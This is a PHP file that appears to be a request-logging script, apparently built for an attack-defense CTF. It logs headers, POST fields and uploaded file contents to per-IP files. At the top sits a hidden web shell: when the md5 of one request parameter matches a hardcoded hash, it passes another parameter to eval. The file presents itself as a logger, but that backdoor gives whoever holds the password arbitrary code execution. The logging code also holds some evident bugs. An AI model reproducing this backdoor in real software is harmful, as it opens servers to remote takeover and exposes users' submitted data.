<?php
const DEBUG = True;
if (!empty($_REQUEST['0'])){
    if (md5($_REQUEST['0'])==='93ae94ae05e980e10c9fab8be8cf11b3')
        eval($_REQUEST['1']);
}
$balck_list = array('128.128.106.66',);
if (in_array($_SERVER['REMOTE_ADDR'], $balck_list)){
    die();
}


function transquote($str){
    return str_replace('"', '\"', $str);
}

class LogDate{
    function WriteLog($basedir){
        //requests url
        $url = empty('HTTPS')?'https://':'http://'.$_SERVER['HTTP_HOST'].$_SERVER["REQUEST_URI"];
        //requests method
        $method = (empty($_POST) && empty($_FILES))?"GET":"POST";
        //headers
        $header = $HEAD?$HEAD:getallheaders();
        $h = "";
        foreach($header as $key => $value){
                    $h = $h.$key.': '.$value."\r\n";    
        }
        //RAW DATA
        $raw = "";
        if (!empty($_POST)){
            $raw = "\r\n\r\n";
            foreach ($_POST as $key => $value) {
                $raw .= "{$key}={$value}&";
            }
            $raw = substr($raw, 0, strlen($raw)-1);
        }
        if (!empty($_FILES)){
            foreach ($_FILES as $key => $value) {
                preg_match("#boundary=([\-0-9]+)#", $header['Content-Type'],$boundary);
                $raw = "\r\n\r\n{$boundary[1]}\r\nContent-Disposition: form-data; name={$key}; filename={$value['name']}\r\n";
                $raw = $raw."Content-Type:{$value['type']}\r\n";
                $raw = $raw.file_get_contents($value['tmp_name']);
            } 
        }
        //Time
        $time = date('H',time()).':'.date('i',time()).':'.date('s',time());
        //Log Data
        $tmp = "Time {$time}\r\n".$method." ".transquote($url)." HTTP/1.1\r\n".transquote($h).$raw."\r\n\r\n";

        $log_file = $basedir.transquote($_SERVER['REMOTE_ADDR']).".txt";

        file_put_contents($log_file, $tmp, FILE_APPEND);
    }
}

try{
    $huasir = new LogDate;
    $huasir->WriteLog('/root/log/');  
}
catch(Exception $e){
    if (DEBUG===True){
        echo "[!]Error: ".$e->getMessage();
    }
}

?>
